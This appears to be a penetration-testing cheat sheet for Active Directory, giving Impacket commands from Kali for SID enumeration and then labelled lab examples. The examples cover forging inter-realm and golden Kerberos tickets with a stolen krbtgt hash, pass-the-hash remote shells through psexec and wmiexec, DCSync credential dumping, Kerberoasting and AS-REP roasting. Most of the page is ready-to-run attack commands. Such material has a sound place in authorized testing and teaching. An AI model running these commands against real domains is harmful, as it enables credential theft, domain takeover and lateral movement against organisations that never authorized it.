## Current operation: Resolve domain identity names through SID lookups

**Run in:** Kali. **Requires:** RPC/SMB reachability and an identity accepted for the lookup; the password is prompted.

```bash
impacket-lookupsid 'DOMAIN/USER@TARGET_IP'
```

**Read the result:** Keep the domain SID and RID-derived object names together when building a user/group map.

**If Only part of the RID space resolves:** A SID lookup result is an identity lead, not a verified password or a complete membership graph; RPC policy may limit enumeration.

**Next check:** Record the domain SID and returned names, then use directory queries to verify account state and memberships.

**Scope of these examples:** The operations above provide the current starting checks. The complete earlier guide, variants and lab transcripts remain below; they retain their original assumptions.

### Example 3: Cross-domain / cross-forest

Run in: **Saved lab example**.

```bash
# child -> parent: forge an inter-realm TGT with the child krbtgt + SID history (sidHistory of Enterprise Admins)
ticketer.py -nthash <krbtgt_hash> -domain-sid <child_sid> -extra-sid <root_sid>-519 -domain child.corp.local Administrator
# intra-forest trust key abuse
lookupsid.py $DOMAIN/USER:PASS@$DC       # get SIDs
```

### Example 4: Original captured examples

Run in: **Saved lab example**.

```bash
# remote execution (need admin creds or hash)
psexec.py $DOMAIN/admin:PASS@$IP            # SYSTEM shell (noisy)
wmiexec.py $DOMAIN/admin@$IP -hashes :<nt>  # semi-interactive, quieter
smbexec.py / atexec.py / dcomexec.py        # alternatives
# credentials
secretsdump.py $DOMAIN/USER:PASS@$DC -just-dc   # DCSync
GetUserSPNs.py $DOMAIN/USER:PASS -dc-ip $DC -request     # Kerberoast
GetNPUsers.py  $DOMAIN/ -usersfile users.txt -no-pass    # AS-REP roast
# tickets
getTGT.py $DOMAIN/USER:PASS ; export KRB5CCNAME=USER.ccache
ticketer.py -nthash <krbtgt> -domain-sid <sid> -domain $DOMAIN Administrator   # golden
# shares / lookups
smbclient.py ; lookupsid.py ; mssqlclient.py $DOMAIN/USER:PASS@$IP -windows-auth
```
